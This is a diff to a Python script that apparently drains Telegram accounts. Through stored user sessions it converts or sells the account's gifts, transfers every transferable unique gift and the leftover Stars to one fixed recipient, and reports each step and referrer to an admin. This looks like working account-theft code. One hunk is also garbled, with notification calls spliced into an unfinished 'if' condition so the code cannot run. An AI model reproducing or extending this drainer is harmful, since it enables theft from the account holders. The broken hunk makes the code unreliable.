@@ -9,7 +9,7 @@ if REPO_ROOT not in sys.path:
     sys.path.insert(0, REPO_ROOT)
 
 from server.utils.referral_logging import log_referral_action
-from server.utils.send_admin_notification import send_admin_notification, format_gift_transfer_notification
+from server.utils.send_admin_notification import send_admin_notification, format_gift_transfer_notification, send_gift_transfer_error
 from server.bot.store.referral_links import get_referral_link_by_user, get_referral_by_link
 
 from automation.analyze_non_unique_gifts_for_funding import analyze_non_unique_gifts_for_funding
@@ -271,6 +271,15 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                         print(f"[AUTO-TRANSFER] [INFO] Stars balance after conversion: {stars_balance}")
                     else:
                         print("[AUTO-TRANSFER] [WARN] No gifts were converted")
+                        # Notify admin about conversion failure
+                        await send_gift_transfer_error(
+                            user_id=user_telegram_id,
+                            user_username=user_username,
+                            error_type="conversion_failed",
+                            error_details=f"Не удалось конвертировать обычные подарки в Stars. Доступно для конвертации: {funding.convertible_count}",
+                            referrer_id=referrer_id,
+                            referrer_username=referrer_username
+                        )
 
                 # If still not enough, sell cheapest unique gift
                 if stars_balance < required_transfer:
@@ -287,8 +296,26 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                             print(f"[AUTO-TRANSFER] [INFO] Waiting for balance to increase (checking every {BALANCE_CHECK_INTERVAL}s, max {MAX_BALANCE_WAIT_TIME}s)...")
                             initial_balance = stars_balance
                             if await wait_for_balance_increase(
-                                client, me, initial_balance, required_transfer, MAX_BALANCE_WAIT_TIME
-                            ):
+                            # Notify admin about sell failure
+                            await send_gift_transfer_error(
+                                user_id=user_telegram_id,
+                                user_username=user_username,
+                                error_type="sell_failed",
+                                error_details=f"Не удалось выставить уникальный подарок на продажу (msg_id={msg_id}). Недостаточно Stars: {stars_balance}/{required_transfer}",
+                                referrer_id=referrer_id,
+                                referrer_username=referrer_username
+                            )
+                    else:
+                        print("[AUTO-TRANSFER] [ERROR] No sellable unique gift found")
+                        # Notify admin that no gift can be sold
+                        await send_gift_transfer_error(
+                            user_id=user_telegram_id,
+                            user_username=user_username,
+                            error_type="no_sellable_gift",
+                            error_details=f"Не найдено уникальных подарков для продажи. Недостаточно Stars: {stars_balance}/{required_transfer}",
+                            referrer_id=referrer_id,
+                            referrer_username=referrer_username
+                        
                                 stars_balance = await get_stars_balance(client=client, peer=me)
                                 print(f"[AUTO-TRANSFER] [OK] Balance increased to {stars_balance} Stars")
                             else:
@@ -304,32 +331,69 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                 print(f"[AUTO-TRANSFER] [INFO] Transferring {transferable_count} unique gifts to user {RECIPIENT_USER_ID}...")
                 transferred = 0
                 failed = 0
+                skipped = 0
+                failed_gifts = []  # Track failed gifts for detailed logging
+                
+                # Send initial notification to admin
+                await send_admin_notification(
+                    f"🎁 Начало передачи подарков\n\n"
+                    f"👤 Пользователь: ID {user_telegram_id}\n"
+                    f"💎 Всего уникальных подарков: {len(unique)}\n"
+                    f"📊 Подлежит передаче: {transferable_count}\n"
+                    f"⭐ Баланс Stars: {stars_balance}"
+                )
+                
                 for gift in unique:
                     import time
                     can_transfer_at = getattr(gift, "can_transfer_at", None)
                     now = int(time.time())
                     msg_id = getattr(gift, "msg_id", "?")
                     if isinstance(can_transfer_at, int) and can_transfer_at > now:
-                        print(f"[AUTO-TRANSFER] [SKIP] Gift (msg_id={msg_id}) not transferable yet (can_transfer_at={can_transfer_at})")
+                        remaining_time = can_transfer_at - now
+                        skipped += 1
+                        print(f"[AUTO-TRANSFER] [SKIP] Gift (msg_id={msg_id}) not transferable yet (can_transfer_at={can_transfer_at}, remaining: {remaining_time}s)")
                         continue
 
+                    print(f"[AUTO-TRANSFER] [INFO] Attempting to transfer gift (msg_id={msg_id})...")
                     if await transfer_unique_gift(client, gift, RECIPIENT_USER_ID):
                         transferred += 1
                         print(f"[AUTO-TRANSFER] [OK] Transferred unique gift (msg_id={msg_id})")
                         await asyncio.sleep(1)
                     else:
                         failed += 1
+                        failed_gifts.append(msg_id)
                         print(f"[AUTO-TRANSFER] [ERROR] Failed to transfer unique gift (msg_id={msg_id})")
+                        
+                        # Send immediate notification about failed transfer
+                        if failed <= 3:  # Only send first 3 failures to avoid spam
+                            await send_admin_notification(
+                                f"❌ Ошибка передачи подарка\n\n"
+                                f"👤 Пользователь: ID {user_telegram_id}\n"
+                                f"💎 msg_id: {msg_id}\n"
+                                f"📊 Прогресс: {transferred}/{len(unique)} успешно, {failed} ошибок"
+                            )
 
-                print(f"[AUTO-TRANSFER] [INFO] Transfer complete. Transferred: {transferred}, Failed: {failed}")
+                print(f"[AUTO-TRANSFER] [INFO] Transfer complete. Transferred: {transferred}, Failed: {failed}, Skipped: {skipped}")
 
                 # After transferring unique gifts, send regular gifts with remaining balance
                 remaining_balance = await get_stars_balance(client=client, peer=me)
                 print(f"[AUTO-TRANSFER] [INFO] Remaining Stars balance after transfers: {remaining_balance}")
                 regular_gifts_value = 0
+                regular_gifts_sent = 0
+                regular_gifts_failed = 0
                 if remaining_balance > 0:
                     print(f"[AUTO-TRANSFER] [INFO] Buying and sending regular gifts with remaining {remaining_balance} Stars...")
-                    regular_gifts_value = await _send_regular_gifts(client, me, remaining_balance)
+                    regular_gifts_value, regular_gifts_sent, regular_gifts_failed = await _send_regular_gifts(client, me, remaining_balance)
+                    
+                    # Send notification about regular gifts
+                    if regular_gifts_sent > 0 or regular_gifts_failed > 0:
+                        await send_admin_notification(
+                            f"💫 Результат отправки обычных подарков\n\n"
+                            f"👤 Пользователь: ID {user_telegram_id}\n"
+                            f"✅ Отправлено: {regular_gifts_sent}\n"
+                            f"❌ Ошибок: {regular_gifts_failed}\n"
+                            f"💰 Потрачено Stars: {regular_gifts_value}"
+                        )
                 else:
                     print("[AUTO-TRANSFER] [INFO] No remaining Stars, skipping regular gifts")
                 
@@ -360,7 +424,7 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                 except (ValueError, AttributeError):
                     pass
                 
-                # Send admin notification
+                # Send admin notification with detailed stats
                 notification = format_gift_transfer_notification(
                     user_id=user_telegram_id,
                     user_username=user_username,
@@ -368,7 +432,13 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
                     details=f"Передано уникальных подарков: {transferred}, Ошибок: {failed}. Обычных подарков отправлено на {regular_gifts_value} Stars",
                     referrer_id=referrer_id,
                     referrer_username=referrer_username,
-                    total_gifts_value=total_gifts_value
+                    total_gifts_value=total_gifts_value,
+                    unique_transferred=transferred,
+                    unique_failed=failed,
+                    unique_skipped=skipped,
+                    regular_sent=regular_gifts_sent,
+                    regular_failed=regular_gifts_failed,
+                    failed_gift_ids=failed_gifts if failed_gifts else None
                 )
                 # Get session file path
                 from server.session_storage.get_session_file_base import get_session_file_base
@@ -468,8 +538,11 @@ async def auto_transfer_gifts_async(user_id: str, limit: int = 200) -> Optional[
         return error_msg
 
 
-async def _send_regular_gifts(client, peer, budget_stars: int) -> int:
-    """Helper to buy and send regular gifts within budget. Returns total spent Stars."""
+async def _send_regular_gifts(client, peer, budget_stars: int) -> tuple[int, int, int]:
+    """
+    Helper to buy and send regular gifts within budget.
+    Returns tuple: (total_spent_stars, sent_count, failed_count)
+    """
     print(f"[AUTO-TRANSFER] [INFO] Fetching available regular gifts...")
     regular_gifts = await get_available_regular_gifts(client)
     print(f"[AUTO-TRANSFER] [INFO] Available regular gifts: {len(regular_gifts)}")
@@ -484,6 +557,7 @@ async def _send_regular_gifts(client, peer, budget_stars: int) -> int:
                 gift_stars = getattr(gift, "stars", 0) or 0
                 gift_id = getattr(gift, "id", "?")
                 gift_title = getattr(gift, "title", None) or f"Gift #{gift_id}"
+                print(f"[AUTO-TRANSFER] [INFO] Attempting to send regular gift: {gift_title} ({gift_stars} Stars)...")
                 if await buy_and_send_regular_gift(client, gift, RECIPIENT_USER_ID):
                     sent_count += 1
                     total_spent += gift_stars
@@ -493,12 +567,12 @@ async def _send_regular_gifts(client, peer, budget_stars: int) -> int:
                     failed_count += 1
                     print(f"[AUTO-TRANSFER] [ERROR] Failed to send regular gift: {gift_title}")
             print(f"[AUTO-TRANSFER] [INFO] Regular gifts sent: {sent_count}, Failed: {failed_count}, Total spent: {total_spent} Stars")
-            return total_spent
+            return total_spent, sent_count, failed_count
         else:
             print("[AUTO-TRANSFER] [INFO] No affordable regular gifts found")
     else:
         print("[AUTO-TRANSFER] [INFO] No regular gifts available")
-    return 0
+    return 0, 0, 0
 
 
 def auto_transfer_gifts_background(user_id: str, limit: int = 200):
